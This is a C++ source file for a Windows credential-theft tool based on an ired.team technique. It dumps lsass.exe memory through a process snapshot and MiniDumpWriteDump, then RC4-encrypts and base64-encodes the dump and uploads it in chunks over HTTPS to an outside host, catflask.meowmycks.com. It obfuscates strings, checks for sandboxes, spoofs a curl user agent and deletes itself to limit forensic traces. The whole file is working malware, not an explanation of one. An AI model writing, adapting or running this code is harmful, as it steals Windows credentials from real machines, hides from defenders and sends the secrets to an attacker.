// credit: ired.team - Dumping Lsass without Mimikatz with MiniDumpWriteDump 
// https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsass-passwords-without-mimikatz-minidumpwritedump-av-signature-bypass

#define NOMINMAX
#include <windows.h>
#include <wincrypt.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <iostream>
#include <sstream>
#include <string>
#include <random>
#include <vector>
#include <cctype>
#include <limits>
#include <ctime>
#include <cstdlib>
#include <tlhelp32.h>
#include <processsnapshot.h>

#pragma comment (lib, "crypt32")
#pragma comment (lib, "winhttp")
#pragma comment (lib, "dbghelp")

// Buffer for saving the minidump
const size_t dumpBufferSize = 1024 * 1024 * 100; // Size of the dump buffer
LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dumpBufferSize);
DWORD bytesRead = 0;

LPVOID destination = 0, source = 0;
DWORD bufferSize = 0;

BOOL CALLBACK minidumpCallback(
	__in     PVOID callbackParam,
	__in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
	__inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
)
{
	switch (callbackInput->CallbackType)
	{
	case 16:
		callbackOutput->Status = S_FALSE;
		break;

	case IoStartCallback:
		callbackOutput->Status = S_FALSE;
		break;

	case IoWriteAllCallback:
		callbackOutput->Status = S_OK;

		source = callbackInput->Io.Buffer;
		destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);

		bufferSize = callbackInput->Io.BufferBytes;
		bytesRead += bufferSize;

		RtlCopyMemory(destination, source, bufferSize);

		break;

	case IoFinishCallback:
		callbackOutput->Status = S_OK;
		break;

	default:
		return true;
	}
	return TRUE;
}

// Convert vectors w ASCII number values to wstrings with their respective characters.
std::wstring ASCIItoWString(const std::vector<int>& asciiValues) {
	std::wstring wstr;
	for (auto val : asciiValues)
		wstr.push_back(static_cast<wchar_t>(val));
	return wstr;
}

// Convert vectors w ASCII number values to strings with their respective characters.
std::string ASCIItoString(const std::vector<int>& asciiValues) {
	std::string str;
	for (int val : asciiValues)
		str += static_cast<char>(val);
	return str;
}

// True Polymorphism
constexpr unsigned int numRNG() {
	const char* timeStr = __TIME__;
	unsigned int hash = 0;

	for (int i = 0; timeStr[i] != '\0'; ++i)
		hash = 31 * hash + timeStr[i];
	return hash % 10;
}

// Encryption Key Generator
std::string Keygen(int length) {
	length += 50;
	std::random_device rd;
	std::mt19937 generator(rd());
	std::uniform_int_distribution<int> distribution(std::numeric_limits<char>::min(), std::numeric_limits<char>::max());

	std::string key;
	key.reserve(length);

	char randomChar;
	for (int i = 0; i < length; ++i) {
		do {
			randomChar = static_cast<char>(distribution(generator));
		} while (!isalnum(randomChar));
		key += randomChar;
	}
	return key;
}

void RC4(std::vector<char>& data, const std::string& key) {
	unsigned char S[256];
	unsigned char temp;
	int i, j = 0, t;

	// Initialize S array
	for (i = 0; i < 256; i++)
		S[i] = i;

	// Key-scheduling algorithm (KSA)
	for (i = 0; i < 256; i++) {
		j = (j + S[i] + key[i % key.size()]) % 256;
		std::swap(S[i], S[j]);
	}

	// Encryption
	i = j = 0;
	for (size_t k = 0; k < data.size(); k++) {
		i = (i + 1) % 256;
		j = (j + S[i]) % 256;
		std::swap(S[i], S[j]);
		t = (S[i] + S[j]) % 256;
		data[k] ^= S[t];
	}
}

std::string EncryptDump(LPVOID dumpBuffer, DWORD dumpBufferSize, const std::string& key) {
	char* buffer = static_cast<char*>(dumpBuffer);
	std::vector<char> data(buffer, buffer + dumpBufferSize);
	RC4(data, key);
	return std::string(data.begin(), data.end());
}

std::string Base64Encode(const std::string& input) {
	DWORD encodedLength = 0;
	if (!CryptBinaryToStringA(reinterpret_cast<const BYTE*>(input.data()), input.length(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &encodedLength))
		return "";

	std::string encoded(encodedLength, '\0');
	if (!CryptBinaryToStringA(reinterpret_cast<const BYTE*>(input.data()), input.length(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &encoded[0], &encodedLength))
		return "";

	encoded.erase(encoded.find('\0'));
	return encoded;
}

std::vector<std::string> SplitDataIntoChunks(const std::string& data, size_t chunkSize) {
	std::vector<std::string> chunks;
	size_t totalSize = data.size();
	size_t offset = 0;

	while (offset < totalSize) {
		size_t nextChunkSize = std::min(chunkSize, totalSize - offset);
		chunks.push_back(data.substr(offset, nextChunkSize));
		offset += nextChunkSize;
	}

	return chunks;
}

bool SendHTTPSRequest(const std::string& hostname, const std::string& path, const std::string& data, bool isKey = false) {
	HINTERNET hSession = WinHttpOpen(L"curl/8.4.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	HINTERNET hConnect = WinHttpConnect(hSession, std::wstring(hostname.begin(), hostname.end()).c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", std::wstring(path.begin(), path.end()).c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
	
	std::wstring headerStr = isKey ? L"Authorization: Bearer " + std::wstring(data.begin(), data.end()) + L"\r\n" : L"";
	LPCWSTR header = isKey ? headerStr.c_str() : WINHTTP_NO_ADDITIONAL_HEADERS;

	bool result = WinHttpSendRequest(hRequest, header, -1, (LPVOID)data.c_str(), data.size(), data.size(), 0);
	if (result) result = WinHttpReceiveResponse(hRequest, NULL);

	DWORD statusCode = 0;
	DWORD statusCodeSize = sizeof(statusCode);
	WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
		WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize,
		WINHTTP_NO_HEADER_INDEX);

	std::cout << "HTTP Status Code: " << statusCode << std::endl;

	// Read and print the response data
	DWORD size = 0;
	DWORD downloaded = 0;
	LPSTR outBuffer;
	std::string response;
	do {
		// Check for available data
		size = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &size)) {
			std::cout << "Error in WinHttpQueryDataAvailable: " << GetLastError() << std::endl;
			break;
		}

		// No more available data
		if (size == 0)
			break;

		// Allocate space for the buffer
		outBuffer = new char[size + 1];
		if (!outBuffer) {
			std::cout << "Out of memory" << std::endl;
			size = 0;
			break;
		}
		else {
			// Read the data
			ZeroMemory(outBuffer, size + 1);
			if (!WinHttpReadData(hRequest, (LPVOID)outBuffer, size, &downloaded)) {
				std::cout << "Error in WinHttpReadData: " << GetLastError() << std::endl;
			}
			else {
				response.append(outBuffer, size);
			}
			delete[] outBuffer;
		}
	} while (size > 0);

	std::cout << "Response Data: " << response << std::endl;

	// Clean up
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);

	return result;
}

void SendDataInChunks(const std::vector<std::string>& chunks, const std::string& hostname, const std::string& path) {
	for (size_t i = 0; i < chunks.size(); ++i) {
		std::string dataToSend = chunks[i];
		if (!SendHTTPSRequest(hostname, path, dataToSend)) {
			// Handle error
		}
	}
}

// Delete itself to limit forensic artifacts
void SelfDelete() {
	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);
	std::string executableName(buffer);

	std::vector<int> cmdPart1 = {99, 109, 100, 32, 47, 67, 32, 100, 101, 108, 32}; // "cmd /C del "
	std::vector<int> cmdPart2 = { 32, 38, 32, 101, 120, 105, 116 }; // " & exit"
	std::string cmd = ASCIItoString(cmdPart1) + "\"" + executableName + "\"" + ASCIItoString(cmdPart2);

	STARTUPINFOA si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

int main() {
	SECURITY_ATTRIBUTES secAttr;
	secAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
	secAttr.lpSecurityDescriptor = NULL;
	secAttr.bInheritHandle = FALSE;

	if (VirtualAllocExNuma(GetCurrentProcess(), NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0) == NULL) return 1;
	if (VirtualFreeEx(GetCurrentProcess(), VirtualAllocExNuma(GetCurrentProcess(), NULL, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0), 0, MEM_RELEASE) == 0) return 1;

	DWORD lsassPID = 0;
	HANDLE lsassHandle = NULL;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	LPCWSTR processName = L"";
	PROCESSENTRY32 processEntry = {};
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	// Get lsass PID
	std::vector<int> exeVect = { 108, 115, 97, 115, 115, 46, 101, 120, 101 };
	std::wstring readableString = ASCIItoWString(exeVect);
	const wchar_t* exeName = readableString.c_str();
	if (Process32First(snapshot, &processEntry)) {
		while (_wcsicmp(processName, exeName) != 0) {
			Process32Next(snapshot, &processEntry);
			processName = processEntry.szExeFile;
			lsassPID = processEntry.th32ProcessID;
		}
	}

	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);

	// Dump lsass
	HANDLE snapshotHandle = NULL;
	DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
	MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
	ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
	CallbackInfo.CallbackRoutine = &minidumpCallback;
	CallbackInfo.CallbackParam = NULL;
	
	PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
	BOOL isDumped = MiniDumpWriteDump(snapshotHandle, lsassPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
	if (isDumped) {
		/* perform in-memory encryption and exfiltration */
		std::string key = Keygen(numRNG());
		std::string data = Base64Encode(EncryptDump(dumpBuffer, bytesRead, key));

		std::vector<std::string> chunks = SplitDataIntoChunks(data, 5 * 1024 * 1024); // 5 MB
		SendDataInChunks(chunks, "catflask.meowmycks.com", "/upload");
		SendHTTPSRequest("catflask.meowmycks.com", "/upload", key, true);
	}

	HeapFree(GetProcessHeap(), 0, dumpBuffer);
	PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);
	SelfDelete();
	return 0;
}